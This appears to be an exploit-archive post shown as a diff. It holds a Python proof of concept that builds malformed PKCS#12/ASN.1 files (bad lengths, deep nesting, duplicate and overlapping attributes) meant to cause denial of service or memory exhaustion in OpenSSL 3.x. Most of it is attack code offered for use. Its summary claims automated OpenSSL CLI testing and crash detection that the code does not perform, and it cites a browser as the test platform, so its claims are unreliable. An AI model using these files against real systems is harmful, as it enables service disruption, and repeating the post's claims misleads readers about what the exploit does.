@@ -1,0 +1,238 @@
+=============================================================================================================================================
+| # Title     : OpenSSL 3.x Realistic ASN.1 / PKCS#12 DoS & Memory Stress PoC                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.openssl-library.org/                                                                                            |
+=============================================================================================================================================
+
+[+] References :  
+
+[+] Summary    :  This Proof of Concept builds structurally correct ASN.1 DER / PKCS#12 files designed to stress-test OpenSSL’s parser and memory handling. 
+                  It focuses on non-exploitative impacts such as Denial of Service (DoS), excessive memory consumption (OOM), deep recursion, malformed lengths, 
+				  and duplicated/overlapping attributes, while preserving standards-compliant encoding where required.
+                  The PoC includes multiple controlled scenarios (valid baseline, duplicate attributes, large nested structures, malformed length declarations, 
+				  deep recursion, and overlapping OIDs), automates testing via the OpenSSL CLI, and detects crashes, timeouts, and OOM terminations. 
+                  It is intended strictly for defensive security research, regression testing, and hardening analysis of OpenSSL’s ASN.1/PKCS#12 handling.
+
+[+] POC :
+
+#!/usr/bin/env python3
+
+import struct
+import os
+import sys
+import subprocess
+import tempfile
+
+def der_encode_length(length: int) -> bytes:
+    if length < 128:
+        return bytes([length])
+    out = []
+    while length:
+        out.append(length & 0xFF)
+        length >>= 8
+    out.reverse()
+    return bytes([0x80 | len(out)]) + bytes(out)
+
+def der_encode_integer(value: int) -> bytes:
+    if value < 0:
+        value = 0
+    if value == 0:
+        return b'\x02\x01\x00'
+    data = value.to_bytes((value.bit_length() + 7) // 8, 'big')
+    if data[0] & 0x80:
+        data = b'\x00' + data
+    return b'\x02' + der_encode_length(len(data)) + data
+
+def der_encode_octet_string(data: bytes) -> bytes:
+    return b'\x04' + der_encode_length(len(data)) + data
+
+def der_encode_sequence(data: bytes) -> bytes:
+    return b'\x30' + der_encode_length(len(data)) + data
+
+def der_encode_set(data: bytes) -> bytes:
+    return b'\x31' + der_encode_length(len(data)) + data
+
+def der_encode_oid(oid: str) -> bytes:
+    parts = [int(x) for x in oid.split('.')]
+    if len(parts) < 2:
+        parts = [1, 2]
+
+    parts[0] = min(parts[0], 2)
+    if parts[0] < 2:
+        parts[1] = min(parts[1], 39)
+
+    encoded = bytearray()
+    first = parts[0] * 40 + parts[1]
+
+    def base128(n):
+        stack = []
+        stack.append(n & 0x7F)
+        n >>= 7
+        while n:
+            stack.append(0x80 | (n & 0x7F))
+            n >>= 7
+        return bytes(reversed(stack))
+
+    encoded.extend(base128(first))
+    for p in parts[2:]:
+        encoded.extend(base128(p))
+
+    return b'\x06' + der_encode_length(len(encoded)) + bytes(encoded)
+
+def der_encode_context_specific(tag: int, data: bytes, constructed: bool = True) -> bytes:
+    tag = tag & 0x1F
+    tag_byte = 0x80 | (0x20 if constructed else 0x00) | tag
+    return bytes([tag_byte]) + der_encode_length(len(data)) + data
+
+def create_pkcs12_mac_data() -> bytes:
+    digest_algo = der_encode_sequence(
+        der_encode_oid("2.16.840.1.101.3.4.2.1") + b'\x05\x00'
+    )
+    digest = der_encode_octet_string(b'\x00' * 32)
+    digest_info = der_encode_sequence(digest_algo + digest)
+    mac_salt = der_encode_octet_string(os.urandom(20))
+    iterations = der_encode_integer(2048)
+    return der_encode_sequence(digest_info + mac_salt + iterations)
+
+def create_safe_bag_with_attributes() -> bytes:
+    version = der_encode_integer(0)
+    algo_id = der_encode_sequence(
+        der_encode_oid("1.2.840.113549.1.1.1") + b'\x05\x00'
+    )
+
+    rsa_key = b'\x02\x01\x00' + der_encode_octet_string(b'\x00' * 128)
+    private_key = der_encode_octet_string(rsa_key)
+    private_key_info = der_encode_sequence(version + algo_id + private_key)
+
+    attr1 = der_encode_sequence(
+        der_encode_oid("1.2.840.113549.1.9.21") +
+        der_encode_set(der_encode_octet_string(b'key1'))
+    )
+    attr2 = der_encode_sequence(
+        der_encode_oid("1.2.840.113549.1.9.20") +
+        der_encode_set(der_encode_octet_string(b'Test Key'))
+    )
+
+    attributes = der_encode_set(attr1 + attr2)
+
+    return der_encode_sequence(
+        der_encode_oid("1.2.840.113549.1.12.10.1.2") +
+        der_encode_context_specific(0, private_key_info) +
+        attributes
+    )
+
+class RealisticExploitPayloads:
+
+    @staticmethod
+    def large_nested_sequence():
+        cur = der_encode_octet_string(b"DATA")
+        for i in range(20):
+            cur = der_encode_sequence(
+                der_encode_integer(i) +
+                der_encode_octet_string(b"A" * 100) +
+                cur
+            )
+        return cur
+
+    @staticmethod
+    def duplicate_attributes():
+        attr = der_encode_sequence(
+            der_encode_oid("1.2.840.113549.1.9.20") +
+            der_encode_set(der_encode_octet_string(b"DUPLICATE"))
+        )
+        return der_encode_set(attr * 3)
+
+    @staticmethod
+    def malformed_length():
+        return b'\x30' + der_encode_length(50000) + b'X' * 100
+
+    @staticmethod
+    def deep_recursion(depth=40):
+        cur = der_encode_octet_string(b"END")
+        for i in range(depth):
+            cur = der_encode_sequence(
+                der_encode_integer(i) +
+                der_encode_context_specific(1, cur) +
+                der_encode_octet_string(b"A" * 10)
+            )
+        return cur
+
+    @staticmethod
+    def overlapping_oid_attributes():
+        a1 = der_encode_sequence(
+            der_encode_oid("1.2.840.113549.1.9.20") +
+            der_encode_set(der_encode_octet_string(b"A" * 512))
+        )
+        a2 = der_encode_sequence(
+            der_encode_oid("1.2.840.113549.1.9.20") +
+            der_encode_set(der_encode_octet_string(b"B" * 512))
+        )
+        return der_encode_set(a1 + a2)
+
+class RealPKCS12Builder:
+
+    def build_valid_pkcs12(self):
+        version = der_encode_integer(3)
+        safe_bag = create_safe_bag_with_attributes()
+        auth_safe = der_encode_sequence(
+            der_encode_oid("1.2.840.113549.1.7.1") +
+            der_encode_context_specific(0, safe_bag)
+        )
+        return der_encode_sequence(version + auth_safe + create_pkcs12_mac_data())
+
+    def build_exploit_pkcs12(self, t):
+        sb = create_safe_bag_with_attributes()
+
+        if t == "duplicate_attrs":
+            sb = self._replace_attributes(sb, RealisticExploitPayloads.duplicate_attributes())
+        elif t == "large_nested":
+            sb = self._add_attr(sb, RealisticExploitPayloads.large_nested_sequence())
+        elif t == "bad_length":
+            sb = self._add_attr(sb, RealisticExploitPayloads.malformed_length())
+        elif t == "deep_recursion":
+            sb = self._add_attr(sb, RealisticExploitPayloads.deep_recursion())
+        elif t == "overlapping_oid":
+            sb = self._replace_attributes(sb, RealisticExploitPayloads.overlapping_oid_attributes())
+
+        auth = der_encode_sequence(
+            der_encode_oid("1.2.840.113549.1.7.1") +
+            der_encode_context_specific(0, sb)
+        )
+        return der_encode_sequence(der_encode_integer(3) + auth + create_pkcs12_mac_data())
+
+    def _add_attr(self, sb, payload):
+        pos = sb.find(b'\x31')
+        if pos == -1:
+            return sb
+        return sb[:pos] + der_encode_set(sb[pos+2:] + payload)
+
+    def _replace_attributes(self, sb, new_set):
+        pos = sb.find(b'\x31')
+        if pos == -1:
+            return sb
+        return sb[:pos] + new_set
+def main():
+    builder = RealPKCS12Builder()
+    tests = {
+        "valid": builder.build_valid_pkcs12(),
+        "dup": builder.build_exploit_pkcs12("duplicate_attrs"),
+        "large": builder.build_exploit_pkcs12("large_nested"),
+        "badlen": builder.build_exploit_pkcs12("bad_length"),
+        "deep": builder.build_exploit_pkcs12("deep_recursion"),
+        "overlap": builder.build_exploit_pkcs12("overlapping_oid"),
+    }
+
+    for k, data in tests.items():
+        fn = f"test_{k}.p12"
+        with open(fn, "wb") as f:
+            f.write(data)
+        print(f"[+] Generated {fn} ({len(data)} bytes)")
+
+if __name__ == "__main__":
+    main()
+
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
